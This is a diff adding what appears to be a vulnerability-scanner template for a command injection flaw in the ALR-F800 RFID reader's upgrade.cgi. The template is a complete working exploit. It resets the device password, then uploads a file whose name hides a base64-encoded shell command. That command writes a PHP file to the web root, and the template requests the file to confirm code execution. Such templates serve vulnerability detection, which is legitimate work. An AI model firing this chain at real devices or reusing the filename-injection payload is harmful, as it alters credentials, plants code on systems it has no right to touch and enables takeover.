@@ -1,0 +1,66 @@
+id: poc-yaml-alientechnology-alr-f800-rce
+info:
+  name: ALR-F800 upgrade.cgi Command Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  description: |
+    This template identifies a command injection vulnerability in Alien Technology ALR-F800 RFID Reader's upgrade.cgi endpoint.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+  pass: '{{rand_int(10000, 90000)}}'
+  authorization: '{{base64(concat("alien:", pass))}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: generate-password
+    method: POST
+    path:
+      - '{{BaseURL}}/cmd.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      cmd=password={{pass}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{pass}}'
+        part: body
+
+  - id: upload-payload
+    method: POST
+    path:
+      - '{{BaseURL}}/cgi-bin/upgrade.cgi'
+    headers:
+      Authorization: "Basic {{authorization}}"
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQ3keNKAe5AQ9G7bs
+    body: |
+      ------WebKitFormBoundaryQ3keNKAe5AQ9G7bs
+      Content-Disposition: form-data; name="uploadedFile"; filename=";echo ZWNobyAiPD9waHAgZWNobyBtZDUoXCRfUkVRVUVTVFsnaWQnXSk7Pz4iID4gL3Zhci93d3cvc2hlbGx0ZXN0LnBocA==| base64 -d | sh"
+      Content-Type: application/octet-stream
+
+      Hi！
+      ------WebKitFormBoundaryQ3keNKAe5AQ9G7bs
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: validate-execution
+    method: GET
+    path:
+      - '{{BaseURL}}/shelltest.php?id={{t1}}'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t2}}'
+        part: body
